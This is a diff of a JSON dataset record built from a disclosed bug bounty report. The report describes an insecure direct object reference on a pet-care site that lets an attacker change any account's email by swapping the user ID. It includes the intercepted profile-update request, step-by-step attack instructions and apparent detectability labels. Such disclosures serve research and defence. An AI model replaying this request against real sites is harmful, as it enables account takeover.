@@ -1,64 +1,64 @@
 {
-    "reported_to": "Mars",
-    "reported_by": "0xs4m ",
-    "title": "\u2588\u2588\u2588\u2588 ' can change any account email and cannot retrieve his account and access it ' at \u2588\u2588\u2588",
-    "content": "\nhi \u2588\u2588\u2588\ni found \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 , i can change any account email and he cannot retrieve his account and access it easily.\ni can't access to his account because url activation on new email don't work and give me error.\nCode 81 Bytes\n1SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data\nbut hackers will be able to disable access users to their account on the site.\nGo to registration page (\u2588\u2588\u2588\u2588)\nVerified your account.\nGo to login page and login your account.\nFor the fastly test, use this credentials to login (you can use this account attacker to send request to burp and test on victim's account's i was created)\nFor Attacker\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nPassword\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 : \u2588\u2588\u2588\u2588\u2588\u2588\u2588\nFor Victim 1\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nPassword\n\u2588\u2588\u2588\u2588 : \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nFor Victim 2\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nPassword\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 : \u2588\u2588\u2588\u2588 For Victim 3\n\u2588\u2588\u2588\u2588\nPassword\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\ni access to my account victim and i go to edit my profil and send request to burp to get id user for this account ( my method of video for the attacker account is the same that i did on the victim account to get her id user ).\nso .. after login i go to edit my account attacker and send request to burp and send it to repeater .. i change my id to victim id and i change email to my new email and click send so i succeeded.\ni received an activation message on my new email i click on active url .. despite give me an error message when i click on the link activation\nCode 81 Bytes\n1SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data\nthe change was made successfully and the victim cannot log into his account, as it will give him an error message when he logs in.\ni created +5 account victim for testing that and its worked, and can kids hackers to change the id user to anything like 10 or 100 or any number and change email this account for that id user.\nburp request\nCode 3.42 KiB\n1POST /_post/usuario_actualizar.php HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Cookie: \u2588\u2588\u2588\u2588\n4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/\u2588\u2588\u2588\u2588\u2588\u2588 Firefox/91.0\n5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate\n8Referer: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n9Content-Type: multipart/form-data; boundary=---------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n10Content-Length: 2851\n11Origin: \u2588\u2588\u2588\u2588\u2588\u2588\u2588-Insecure-Requests: 1\n12Sec-Fetch-Dest: iframe\n13Sec-Fetch-Mode: navigate\n14Sec-Fetch-Site: same-origin\n15Sec-Fetch-User: ?1\n16Te: trailers\n17Connection: close\n18\n19-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n20Content-Disposition: form-data; name=\"nombre\"\n21\n22attacker\n23-----------------------------297392175112058\u2588\u2588\u2588\u25887932062474594\n24Content-Disposition: form-data; name=\"apellido\"\n25\n26attacker\n27-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n28Content-Disposition: form-data; name=\"email\"\n29\n30\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n31-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n32Content-Disposition: form-data; name=\"rut\"\n33\n34\n35-----------------------------297392175112058\u2588\u2588\u25887932062474594\n36Content-Disposition: form-data; name=\"idProvincia\"\n37\n380\n39-----------------------------297392175112058\u2588\u2588\u25887932062474594\n40Content-Disposition: form-data; name=\"idLocalidad\"\n41\n420\n43-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n44Content-Disposition: form-data; name=\"optin[usuario_info_miroyalcanin]\"\n45\n46no\n47-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n48Content-Disposition: form-data; name=\"optin[usuario_info_miroyalcanin]\"\n49\n50si\n51-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n52Content-Disposition: form-data; name=\"optin[usuario_info_marspetcare]\"\n53\n54no\n55-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n56Content-Disposition: form-data; name=\"optin[usuario_info_marspetcare]\"\n57\n58si\n59-----------------------------297392175112058\u2588\u2588\u2588\u25887932062474594\n60Content-Disposition: form-data; name=\"optin[usuario_investigaciones]\"\n61\n62no\n63-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n64Content-Disposition: form-data; name=\"optin[usuario_investigaciones]\"\n65\n66si\n67-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n68Content-Disposition: form-data; name=\"optin[usuario_info_perros]\"\n69\n70no\n71-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n72Content-Disposition: form-data; name=\"optin[usuario_info_perros]\"\n73\n74si\n75-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n76Content-Disposition: form-data; name=\"optin[usuario_info_gatos]\"\n77\n78no\n79-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n80Content-Disposition: form-data; name=\"optin[usuario_info_gatos]\"\n81\n82si\n83-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n84Content-Disposition: form-data; name=\"switch_pass\"\n85\n86off\n87-----------------------------297392175112058\u2588\u2588\u25887932062474594\n88Content-Disposition: form-data; name=\"ck_oldpass\"\n89\n90Password\n91-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n92Content-Disposition: form-data; name=\"oldpass\"\n93\n94\n95-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n96Content-Disposition: form-data; name=\"clave\"\n97\n98\n99-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n100Content-Disposition: form-data; name=\"clave2\"\n101\n102\n103-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n104Content-Disposition: form-data; name=\"\u2588\u2588\u2588\u2588\u2588\"\n105\n10688796\n107-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594--\n\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\n",
-    "severity": [
-        7.8,
-        null
+  "reported_to": "Mars",
+  "reported_by": "0xs4m ",
+  "title": "\u2588\u2588\u2588\u2588 ' can change any account email and cannot retrieve his account and access it ' at \u2588\u2588\u2588",
+  "content": "\nhi \u2588\u2588\u2588\ni found \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 , i can change any account email and he cannot retrieve his account and access it easily.\ni can't access to his account because url activation on new email don't work and give me error.\nCode 81 Bytes\n1SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data\nbut hackers will be able to disable access users to their account on the site.\nGo to registration page (\u2588\u2588\u2588\u2588)\nVerified your account.\nGo to login page and login your account.\nFor the fastly test, use this credentials to login (you can use this account attacker to send request to burp and test on victim's account's i was created)\nFor Attacker\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nPassword\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 : \u2588\u2588\u2588\u2588\u2588\u2588\u2588\nFor Victim 1\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nPassword\n\u2588\u2588\u2588\u2588 : \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nFor Victim 2\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nPassword\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 : \u2588\u2588\u2588\u2588 For Victim 3\n\u2588\u2588\u2588\u2588\nPassword\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\ni access to my account victim and i go to edit my profil and send request to burp to get id user for this account ( my method of video for the attacker account is the same that i did on the victim account to get her id user ).\nso .. after login i go to edit my account attacker and send request to burp and send it to repeater .. i change my id to victim id and i change email to my new email and click send so i succeeded.\ni received an activation message on my new email i click on active url .. despite give me an error message when i click on the link activation\nCode 81 Bytes\n1SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data\nthe change was made successfully and the victim cannot log into his account, as it will give him an error message when he logs in.\ni created +5 account victim for testing that and its worked, and can kids hackers to change the id user to anything like 10 or 100 or any number and change email this account for that id user.\nburp request\nCode 3.42 KiB\n1POST /_post/usuario_actualizar.php HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Cookie: \u2588\u2588\u2588\u2588\n4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/\u2588\u2588\u2588\u2588\u2588\u2588 Firefox/91.0\n5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate\n8Referer: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n9Content-Type: multipart/form-data; boundary=---------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n10Content-Length: 2851\n11Origin: \u2588\u2588\u2588\u2588\u2588\u2588\u2588-Insecure-Requests: 1\n12Sec-Fetch-Dest: iframe\n13Sec-Fetch-Mode: navigate\n14Sec-Fetch-Site: same-origin\n15Sec-Fetch-User: ?1\n16Te: trailers\n17Connection: close\n18\n19-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n20Content-Disposition: form-data; name=\"nombre\"\n21\n22attacker\n23-----------------------------297392175112058\u2588\u2588\u2588\u25887932062474594\n24Content-Disposition: form-data; name=\"apellido\"\n25\n26attacker\n27-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n28Content-Disposition: form-data; name=\"email\"\n29\n30\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n31-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n32Content-Disposition: form-data; name=\"rut\"\n33\n34\n35-----------------------------297392175112058\u2588\u2588\u25887932062474594\n36Content-Disposition: form-data; name=\"idProvincia\"\n37\n380\n39-----------------------------297392175112058\u2588\u2588\u25887932062474594\n40Content-Disposition: form-data; name=\"idLocalidad\"\n41\n420\n43-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n44Content-Disposition: form-data; name=\"optin[usuario_info_miroyalcanin]\"\n45\n46no\n47-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n48Content-Disposition: form-data; name=\"optin[usuario_info_miroyalcanin]\"\n49\n50si\n51-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n52Content-Disposition: form-data; name=\"optin[usuario_info_marspetcare]\"\n53\n54no\n55-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n56Content-Disposition: form-data; name=\"optin[usuario_info_marspetcare]\"\n57\n58si\n59-----------------------------297392175112058\u2588\u2588\u2588\u25887932062474594\n60Content-Disposition: form-data; name=\"optin[usuario_investigaciones]\"\n61\n62no\n63-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n64Content-Disposition: form-data; name=\"optin[usuario_investigaciones]\"\n65\n66si\n67-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n68Content-Disposition: form-data; name=\"optin[usuario_info_perros]\"\n69\n70no\n71-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n72Content-Disposition: form-data; name=\"optin[usuario_info_perros]\"\n73\n74si\n75-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n76Content-Disposition: form-data; name=\"optin[usuario_info_gatos]\"\n77\n78no\n79-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n80Content-Disposition: form-data; name=\"optin[usuario_info_gatos]\"\n81\n82si\n83-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n84Content-Disposition: form-data; name=\"switch_pass\"\n85\n86off\n87-----------------------------297392175112058\u2588\u2588\u25887932062474594\n88Content-Disposition: form-data; name=\"ck_oldpass\"\n89\n90Password\n91-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n92Content-Disposition: form-data; name=\"oldpass\"\n93\n94\n95-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n96Content-Disposition: form-data; name=\"clave\"\n97\n98\n99-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n100Content-Disposition: form-data; name=\"clave2\"\n101\n102\n103-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594\n104Content-Disposition: form-data; name=\"\u2588\u2588\u2588\u2588\u2588\"\n105\n10688796\n107-----------------------------297392175112058\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25887932062474594--\n\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\n",
+  "severity": [
+    7.8,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Insecure Direct Object Reference (IDOR)"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1687546440,
+  "report_url": "https://hackerone.com/reports/1952771",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Register an account on the target site and verify it."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Insecure Direct Object Reference (IDOR)"
+    [
+      2,
+      "Log in to the attacker account and navigate to the profile edit page."
     ],
-    "screenshots": {},
-    "disclosed_date": 1687546440,
-    "report_url": "https://hackerone.com/reports/1952771",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "HIGH",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Register an account on the target site and verify it."
-        ],
-        [
-            2,
-            "Log in to the attacker account and navigate to the profile edit page."
-        ],
-        [
-            3,
-            "Intercept the profile update request using Burp Suite."
-        ],
-        [
-            4,
-            "Modify the request to change the user ID to a victim's ID and update the email to a new attacker-controlled email."
-        ],
-        [
-            5,
-            "Submit the modified request, which changes the victim's email without proper authorization."
-        ],
-        [
-            6,
-            "Observe that the victim can no longer access their account, even though the email activation link fails."
-        ]
+    [
+      3,
+      "Intercept the profile update request using Burp Suite."
     ],
-    "vuln_description": "The vulnerability allows an attacker to change any user's email address by manipulating the user ID in a profile update request. This results in account takeover as the victim loses access to their account, and the attacker gains control, though the email activation link may fail.",
-    "reason": "The attack involves intercepting and modifying a request, which is a common technique, but requires understanding of how user IDs are handled in the application. The vulnerability stems from insufficient authorization checks when updating user emails.",
-    "new_complexity": "MEDIUM",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": true,
-    "authnz_byppass_detectable": false,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": true,
-        "authnz_byppass_detectable": false
-    }
+    [
+      4,
+      "Modify the request to change the user ID to a victim's ID and update the email to a new attacker-controlled email."
+    ],
+    [
+      5,
+      "Submit the modified request, which changes the victim's email without proper authorization."
+    ],
+    [
+      6,
+      "Observe that the victim can no longer access their account, even though the email activation link fails."
+    ]
+  ],
+  "vuln_description": "The vulnerability allows an attacker to change any user's email address by manipulating the user ID in a profile update request. This results in account takeover as the victim loses access to their account, and the attacker gains control, though the email activation link may fail.",
+  "reason": "The attack involves intercepting and modifying a request, which is a common technique, but requires understanding of how user IDs are handled in the application. The vulnerability stems from insufficient authorization checks when updating user emails.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": true,
+  "authnz_byppass_detectable": false,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an IDOR (Insecure Direct Object Reference) where an attacker can change the email of any account by manipulating the user_id in the request. This falls under the methodology of testing (user_session, action, resource_id) tuples by swapping resource_ids (user_id in this case) with existing actions. The detection method involves collecting these tuples and testing with different user_sessions and resource_ids, which would uncover this vulnerability.",
+    "is_detectable": true
+  }
 }
